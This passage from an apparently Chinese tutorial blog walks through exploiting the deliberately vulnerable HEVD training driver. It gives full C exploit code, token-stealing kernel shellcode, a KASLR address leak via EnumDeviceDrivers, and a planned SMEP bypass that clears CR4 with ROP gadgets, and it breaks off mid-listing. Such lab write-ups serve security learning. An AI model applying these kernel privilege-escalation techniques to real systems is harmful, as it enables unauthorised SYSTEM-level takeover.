class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与Linux下的内核利用相同,首先我们要做的就是获取这个设备的句柄</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_NAME <span class="string">&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span></span></span><br><span class="line"></span><br><span class="line">HANDLE <span class="title function_">GetDeviceHandle</span><span class="params">(LPCSTR FileName)</span> &#123;</span><br><span class="line">    HANDLE hFile = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    hFile = CreateFile(FileName,</span><br><span class="line">                       GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">                       FILE_SHARE_READ | FILE_SHARE_WRITE,</span><br><span class="line">                       <span class="literal">NULL</span>,</span><br><span class="line">                       OPEN_EXISTING,</span><br><span class="line">                       FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,</span><br><span class="line">                       <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> hFile;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>设备名字的开头需要是<code>\\.\</code>代表这是本地的一个设备,这是命名约定</p><p>然后分配一块内存用于存储我们的payload,长度也就是<code>0x81C+4+4</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RtlFillMemory((PVOID)UserModeBuffer, UserModeBufferSize, <span class="number">0x41</span>);</span><br><span class="line"></span><br><span class="line">MemoryAddress = (PVOID)(((ULONG)UserModeBuffer + UserModeBufferSize) - <span class="keyword">sizeof</span>(ULONG));</span><br><span class="line">*(PULONG)MemoryAddress = (ULONG)EopPayload;</span><br></pre></td></tr></table></figure><p>在windows7_32中并没有smep这样的保护限制,所以我们可以直接在用户态写下提权的shellcode,然后在内核态下跳转到执行</p><p>使用DeviIoControl进行触发,DeviIoControl的参数就会被使用IRP包装并传递给驱动设备</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DeviceIoControl(hFile,</span><br><span class="line">                HACKSYS_EVD_IOCTL_STACK_OVERFLOW,</span><br><span class="line">                (LPVOID)UserModeBuffer,</span><br><span class="line">                (DWORD)UserModeBufferSize,</span><br><span class="line">                <span class="literal">NULL</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                &amp;BytesReturned,</span><br><span class="line">                <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><h3 id="token窃取"><a href="#token窃取" class="headerlink" title="token窃取"></a>token窃取</h3><p>token窃取是windows内核提权十分常用的手段</p><p>在 Windows 内核中，每个进程都有一个 <code>Token</code>，它代表了该进程的安全属性，包括用户身份和权限。</p><p>当进程尝试执行某些操作时，系统会检查 <code>Token</code>，看看进程是否有权限执行该操作。</p><p>token窃取的原理就是</p><blockquote><p><code>Token</code> 是一个内核对象，进程的内核数据结构（<code>EPROCESS</code>）中包含一个指向 <code>Token</code> 的指针。</p><p>由于这个指针存储在内核内存中，如果我们能在内核模式下修改这个指针，就可以让当前进程“冒充”另一个进程，比如 <code>System</code> 进程，从而获得 <code>NT AUTHORITY\SYSTEM</code> 权限。</p></blockquote><p>接下来的提权利用就依赖这个方法</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>回过头来看HEVD提权的shellcode</p><p>EopPayload实际上就是TokenStealingPayloadWin7函数的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">VOID TokenStealingPayloadWin7() &#123;</span><br><span class="line">    // Importance of Kernel Recovery</span><br><span class="line">    __asm &#123;</span><br><span class="line">        pushad                               ; Save registers state</span><br><span class="line"></span><br><span class="line">        ; Start of Token Stealing Stub</span><br><span class="line">        xor eax, eax                         ; Set ZERO</span><br><span class="line">        mov eax, fs:[eax + KTHREAD_OFFSET]   ; Get nt!_KPCR.PcrbData.CurrentThread</span><br><span class="line">                                             ; _KTHREAD is located at FS:[0x124]</span><br><span class="line"></span><br><span class="line">        mov eax, [eax + EPROCESS_OFFSET]     ; Get nt!_KTHREAD.ApcState.Process</span><br><span class="line"></span><br><span class="line">        mov ecx, eax                         ; Copy current process _EPROCESS structure</span><br><span class="line"></span><br><span class="line">        mov edx, SYSTEM_PID                  ; WIN 7 SP1 SYSTEM process PID = 0x4</span><br><span class="line"></span><br><span class="line">        SearchSystemPID:</span><br><span class="line">            mov eax, [eax + FLINK_OFFSET]    ; Get nt!_EPROCESS.ActiveProcessLinks.Flink</span><br><span class="line">            sub eax, FLINK_OFFSET</span><br><span class="line">            cmp [eax + PID_OFFSET], edx      ; Get nt!_EPROCESS.UniqueProcessId</span><br><span class="line">            jne SearchSystemPID</span><br><span class="line"></span><br><span class="line">        mov edx, [eax + TOKEN_OFFSET]        ; Get SYSTEM process nt!_EPROCESS.Token</span><br><span class="line">        mov [ecx + TOKEN_OFFSET], edx        ; Replace target process nt!_EPROCESS.Token</span><br><span class="line">                                             ; with SYSTEM process nt!_EPROCESS.Token</span><br><span class="line">        ; End of Token Stealing Stub</span><br><span class="line"></span><br><span class="line">        popad                                ; Restore registers state</span><br><span class="line"></span><br><span class="line">        ; Kernel Recovery Stub</span><br><span class="line">        xor eax, eax                         ; Set NTSTATUS SUCCEESS</span><br><span class="line">        add esp, 12                          ; Fix the stack</span><br><span class="line">        pop ebp                              ; Restore saved EBP</span><br><span class="line">        ret 8                                ; Return cleanly</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一段shellcode做的就是循环遍历进程,并将系统system进程的token替换给当前进程</p><p>在 Windows 操作系统中，<code>FS</code> 寄存器在用户态和内核态指向不同的内存区域</p><p>用户态<code>FS</code> 寄存器指向 <strong>线程环境块（TEB，Thread Environment Block）</strong></p><p>内核态<code>FS</code> 寄存器指向 <strong>处理器控制区域（KPCR，Kernel Processor Control Region）</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span>: kd&gt; dt nt!_KPCR</span><br><span class="line">   +<span class="number">0x000</span> NtTib            : _NT_TIB</span><br><span class="line">   +<span class="number">0x000</span> Used_ExceptionList : Ptr32 _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x004</span> Used_StackBase   : Ptr32 Void</span><br><span class="line">   +<span class="number">0x008</span> Spare2           : Ptr32 Void</span><br><span class="line">   +<span class="number">0x00c</span> TssCopy          : Ptr32 Void</span><br><span class="line">   +<span class="number">0x010</span> ContextSwitches  : Uint4B</span><br><span class="line">   +<span class="number">0x014</span> SetMemberCopy    : Uint4B</span><br><span class="line">   +<span class="number">0x018</span> Used_Self        : Ptr32 Void</span><br><span class="line">   +<span class="number">0x01c</span> SelfPcr          : Ptr32 _KPCR</span><br><span class="line">   +<span class="number">0x020</span> Prcb             : Ptr32 _KPRCB</span><br><span class="line">   +<span class="number">0x024</span> Irql             : UChar</span><br><span class="line">   +<span class="number">0x028</span> IRR              : Uint4B</span><br><span class="line">   +<span class="number">0x02c</span> IrrActive        : Uint4B</span><br><span class="line">   +<span class="number">0x030</span> IDR              : Uint4B</span><br><span class="line">   +<span class="number">0x034</span> KdVersionBlock   : Ptr32 Void</span><br><span class="line">   +<span class="number">0x038</span> IDT              : Ptr32 _KIDTENTRY</span><br><span class="line">   +<span class="number">0x03c</span> GDT              : Ptr32 _KGDTENTRY</span><br><span class="line">   +<span class="number">0x040</span> TSS              : Ptr32 _KTSS</span><br><span class="line">   +<span class="number">0x044</span> MajorVersion     : Uint2B</span><br><span class="line">   +<span class="number">0x046</span> MinorVersion     : Uint2B</span><br><span class="line">   +<span class="number">0x048</span> SetMember        : Uint4B</span><br><span class="line">   +<span class="number">0x04c</span> StallScaleFactor : Uint4B</span><br><span class="line">   +<span class="number">0x050</span> SpareUnused      : UChar</span><br><span class="line">   +<span class="number">0x051</span> Number           : UChar</span><br><span class="line">   +<span class="number">0x052</span> Spare0           : UChar</span><br><span class="line">   +<span class="number">0x053</span> SecondLevelCacheAssociativity : UChar</span><br><span class="line">   +<span class="number">0x054</span> VdmAlert         : Uint4B</span><br><span class="line">   +<span class="number">0x058</span> KernelReserved   : [<span class="number">14</span>] Uint4B</span><br><span class="line">   +<span class="number">0x090</span> SecondLevelCacheSize : Uint4B</span><br><span class="line">   +<span class="number">0x094</span> HalReserved      : [<span class="number">16</span>] Uint4B</span><br><span class="line">   +<span class="number">0x0d4</span> InterruptMode    : Uint4B</span><br><span class="line">   +<span class="number">0x0d8</span> Spare1           : UChar</span><br><span class="line">   +<span class="number">0x0dc</span> KernelReserved2  : [<span class="number">17</span>] Uint4B</span><br><span class="line">   +<span class="number">0x120</span> PrcbData         : _KPRCB</span><br><span class="line">       </span><br><span class="line"><span class="number">3</span>: kd&gt; dt _KPRCB</span><br><span class="line">nt!_KPRCB</span><br><span class="line">   +<span class="number">0x000</span> MinorVersion     : Uint2B</span><br><span class="line">   +<span class="number">0x002</span> MajorVersion     : Uint2B</span><br><span class="line">   +<span class="number">0x004</span> CurrentThread    : Ptr32 _KTHREAD</span><br></pre></td></tr></table></figure><p>首先从KPCR的0x124偏移处获取CurrentThread</p><p>再从CurrentThread的0x50偏移处获取Eprocess的地址,并保存此时的Eprocess地址</p><p>windows的system的进程ID一般都是0x4</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-15_151441.png" alt=""></p><p>在_EPROCESS的0xb8处有一个ActiveProcessLinks字段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt _EPROCESS</span><br><span class="line">nt!_EPROCESS</span><br><span class="line">   +<span class="number">0x000</span> Pcb              : _KPROCESS</span><br><span class="line">   +<span class="number">0x098</span> ProcessLock      : _EX_PUSH_LOCK</span><br><span class="line">   +<span class="number">0x0a0</span> CreateTime       : _LARGE_INTEGER</span><br><span class="line">   +<span class="number">0x0a8</span> ExitTime         : _LARGE_INTEGER</span><br><span class="line">   +<span class="number">0x0b0</span> RundownProtect   : _EX_RUNDOWN_REF</span><br><span class="line">   +<span class="number">0x0b4</span> UniqueProcessId  : Ptr32 Void</span><br><span class="line">   +<span class="number">0x0b8</span> ActiveProcessLinks : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x0c0</span> ProcessQuotaUsage : [<span class="number">2</span>] Uint4B</span><br><span class="line">   +<span class="number">0x0c8</span> ProcessQuotaPeak : [<span class="number">2</span>] Uint4B</span><br><span class="line">   +<span class="number">0x0d0</span> CommitCharge     : Uint4B</span><br><span class="line">   +<span class="number">0x0d4</span> QuotaBlock       : Ptr32 _EPROCESS_QUOTA_BLOCK</span><br><span class="line">   +<span class="number">0x0d8</span> CpuQuotaBlock    : Ptr32 _PS_CPU_QUOTA_BLOCK</span><br><span class="line">   +<span class="number">0x0dc</span> PeakVirtualSize  : Uint4B</span><br><span class="line">   +<span class="number">0x0e0</span> VirtualSize      : Uint4B</span><br><span class="line">   +<span class="number">0x0e4</span> SessionProcessLinks : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x0ec</span> DebugPort        : Ptr32 Void</span><br><span class="line">   +<span class="number">0x0f0</span> ExceptionPortData : Ptr32 Void</span><br><span class="line">   +<span class="number">0x0f0</span> ExceptionPortValue : Uint4B</span><br><span class="line">   +<span class="number">0x0f0</span> ExceptionPortState : Pos <span class="number">0</span>, <span class="number">3</span> Bits</span><br><span class="line">   +<span class="number">0x0f4</span> ObjectTable      : Ptr32 _HANDLE_TABLE</span><br><span class="line">   +<span class="number">0x0f8</span> Token            : _EX_FAST_REF</span><br></pre></td></tr></table></figure><p>用于链接所有的进程结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt _LIST_ENTRY</span><br><span class="line">nt!_LIST_ENTRY</span><br><span class="line">   +<span class="number">0x000</span> Flink            : Ptr32 _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x004</span> Blink            : Ptr32 _LIST_ENTRY</span><br></pre></td></tr></table></figure><p>这样不停的遍历直到找到PID为4的system则进行提权操作,提权操作就是将此时system的Token字段复制到此前保存的进程结构中完成提权</p><p>综上我们可以写出一份简单且完整的exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__declspec(naked) <span class="type">void</span> <span class="title function_">shellcode</span><span class="params">()</span> &#123;</span><br><span class="line">  __asm &#123;</span><br><span class="line">    pushad</span><br><span class="line">    xor eax, eax</span><br><span class="line">    mov eax, dword ptr fs : [eax + <span class="number">124</span>h]</span><br><span class="line">    mov eax, dword ptr[eax + <span class="number">50</span>h]</span><br><span class="line">    mov ecx, eax</span><br><span class="line">    mov edx, <span class="number">4</span></span><br><span class="line"></span><br><span class="line">SearchSystemPID :</span><br><span class="line">    mov eax, dword ptr[eax + <span class="number">0B</span>8h]</span><br><span class="line">    sub eax, <span class="number">0B</span>8h</span><br><span class="line">    cmp dword ptr[eax + <span class="number">0B</span>4h], edx</span><br><span class="line">    jne SearchSystemPID</span><br><span class="line"></span><br><span class="line">    mov edx, dword ptr[eax + <span class="number">0F</span>8h]</span><br><span class="line">    mov dword ptr[ecx + <span class="number">0F</span>8h], edx</span><br><span class="line">    popad</span><br><span class="line">    xor eax, eax</span><br><span class="line">    pop ebp</span><br><span class="line">    ret <span class="number">8</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  HANDLE hDriver = CreateFile(<span class="string">L&quot;\\\\.\\HacksysExtremeVulnerableDriver&quot;</span>, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span> (hDriver == INVALID_HANDLE_VALUE)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] Error while creating a handle to the driver: %d\n&quot;</span>, GetLastError());</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> bufSize = <span class="number">0x824</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span>* uBuffer = VirtualAlloc(<span class="literal">NULL</span>, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">  <span class="keyword">if</span> (uBuffer == <span class="literal">NULL</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;VirtualAlloc failed with error: %d\n&quot;</span>, GetLastError());</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  RtlFillMemory(uBuffer, bufSize, <span class="string">&#x27;\x41&#x27;</span>);</span><br><span class="line">  *(ULONG_PTR*)((BYTE*)uBuffer + bufSize - <span class="keyword">sizeof</span>(ULONG_PTR)) = (ULONG_PTR)shellcode;</span><br><span class="line">  ULONG BytesReturned;</span><br><span class="line">  DeviceIoControl(hDriver,</span><br><span class="line">    <span class="number">0x222003</span>,</span><br><span class="line">    (LPVOID)uBuffer,</span><br><span class="line">    (DWORD)bufSize,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    &amp;BytesReturned,</span><br><span class="line">    <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  system(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h2><p>Windows系统在<strong>Windows 8</strong>和<strong>Windows Server 2012</strong>中首次引入了SMEP（Supervisor Mode Execution Protection）保护机制。SMEP通过硬件支持（如Intel的SMEP功能）防止内核模式代码执行用户空间的内存，增强了系统的安全性，减少了内核漏洞的利用风险。</p><p>在win7_32的环境下,由于没有smep的存在,我们直接将程序的执行流控制到用户态执行shellcode即可完成提权操作</p><p>但这招在win10_x64下显然没有办法成功,那么该如何利用这个漏洞呢</p><p>两个方法:</p><ol><li>通过将CR4寄存器的第20位置零,关闭smep保护</li><li>不与用户空间产生交际,完全在内核空间完成提权</li></ol><p>第二种方法我们则要么能够在内核空间中找到一个可写可执行的位置,或者完全利用gadget进行提权(这显然更难)</p><p>而如果是第一种方法,如果开启了kpti保护那又更难办,kpti的作用是隔离内核页表与用户页表,然而基于x86_64的实现同时也会在内核态时将用户空间标记为不可执行</p><p>这里我们就不难为自己了,就按照默认设置中的无kpti保护</p><h3 id="kaslr"><a href="#kaslr" class="headerlink" title="kaslr"></a>kaslr</h3><p>两种方法还都受着Kaslr的影响,那么一步一步来,先让我们开始解决Kaslr</p><p>解决kaslr的方法无论win还是linux,内核态还是用户态,无非就是泄露内存地址并减去偏移得到基址</p><p>在linux下这可能很麻烦,例如需要uaf等漏洞控制特殊结构体,并以此泄露残留指针等</p><p>但我们此时是windows, Windows 中有一个安全机制称为<strong>完整性级别（Integrity Level）</strong> ，用于限制进程对系统资源的访问权限</p><p>只要我们拥有<strong>中完整性级别(普通用户默认启动应用程序所在级别)</strong>,windows就会开放一些十分有用API给我们</p><p><code>EnumDeviceDrivers</code> 函数存在于 <code>psapi.h</code> 中，可以枚举所有设备驱动程序，包括内核本身，并给出设备驱动程序的基址。它将返回一个设备驱动程序列表，其中第一个就是内核本身</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">EnumDeviceDrivers</span><span class="params">(</span></span><br><span class="line"><span class="params">  LPVOID  *lpImageBase,<span class="comment">//接收设备驱动程序地址的缓冲区</span></span></span><br><span class="line"><span class="params">  DWORD   cb,<span class="comment">//缓冲区大小</span></span></span><br><span class="line"><span class="params">  LPDWORD lpcbNeeded<span class="comment">//返回实际需要的字节数</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>写一个验证案例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;psapi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">PrintDeviceDrivers</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="comment">// 缓冲区用于存储设备驱动程序的地址</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;LPVOID&gt; <span class="title function_">drivers</span><span class="params">(<span class="number">1024</span>)</span>;</span><br><span class="line">  DWORD bytesNeeded;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 枚举设备驱动程序</span></span><br><span class="line">  <span class="keyword">if</span> (!EnumDeviceDrivers(drivers.data(), static_cast&lt;DWORD&gt;(drivers.size() * <span class="keyword">sizeof</span>(LPVOID)), &amp;bytesNeeded)) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;EnumDeviceDrivers failed. Error: &quot;</span> &lt;&lt; GetLastError() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果缓冲区不足，则调整大小并重新调用</span></span><br><span class="line">  <span class="keyword">if</span> (bytesNeeded &gt; drivers.size() * <span class="keyword">sizeof</span>(LPVOID)) &#123;</span><br><span class="line">    drivers.resize(bytesNeeded / <span class="keyword">sizeof</span>(LPVOID));</span><br><span class="line">    <span class="keyword">if</span> (!EnumDeviceDrivers(drivers.data(), static_cast&lt;DWORD&gt;(drivers.size() * <span class="keyword">sizeof</span>(LPVOID)), &amp;bytesNeeded)) &#123;</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;EnumDeviceDrivers failed after resizing. Error: &quot;</span> &lt;&lt; GetLastError() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 打印设备驱动程序信息</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Loaded Device Drivers:\n&quot;</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; bytesNeeded / <span class="keyword">sizeof</span>(LPVOID); ++i) &#123;</span><br><span class="line">    TCHAR driverName[MAX_PATH];</span><br><span class="line">    <span class="keyword">if</span> (GetDeviceDriverBaseName(drivers[i], driverName, MAX_PATH)) &#123;</span><br><span class="line">      <span class="built_in">std</span>::wcout &lt;&lt; <span class="string">L&quot;Driver: &quot;</span> &lt;&lt; driverName &lt;&lt; <span class="string">L&quot; at address &quot;</span> &lt;&lt; drivers[i] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Failed to get driver name. Error: &quot;</span> &lt;&lt; GetLastError() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  PrintDeviceDrivers();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行测试</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-15_164121.png" alt=""></p><p><code>ntoskrnl.exe</code>就是内核的核心组件,它的加载基址就是windows内核代码段的加载基址</p><p>是的,令人头大的Kaslr保护就这样被轻而易举破解了</p><h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><p>现在让我们尝试第一种解决方案,在<code>ntoskrnl.exe</code>中有这样的gadget</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop rcx; ret;</span><br><span class="line">mov cr4, rcx; ret;</span><br></pre></td></tr></table></figure><p>那么我们就完全有能力修改CR4寄存器</p><p>通过windbg观察常规状态下cr4寄存器的值</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-25_212449.png" alt=""></p><p>第20位处的值是1,也就代表开启了smep保护,所以需要将其关闭,让后跳转到用户内存执行shellcode</p><h4 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h4><p>win10_x64的内核提权shellcode本质上与win7_x32下区别并不太大,但依然会有一些区别</p><p>这里依然采用常见的token窃取提权方式,不过针对win10_x64环境需要对shellcode做出一些改变</p><p>在github上找到一段有效的shellcoe<a href="https://github.com/Kristal-g/kristal-g.github.io/blob/master/assets/code/shellcode_fix_stack_pivot.asm">kristal-g.github.io/assets/code/shellcode_fix_stack_pivot.asm at master · Kristal-g/kristal-g.github.io</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 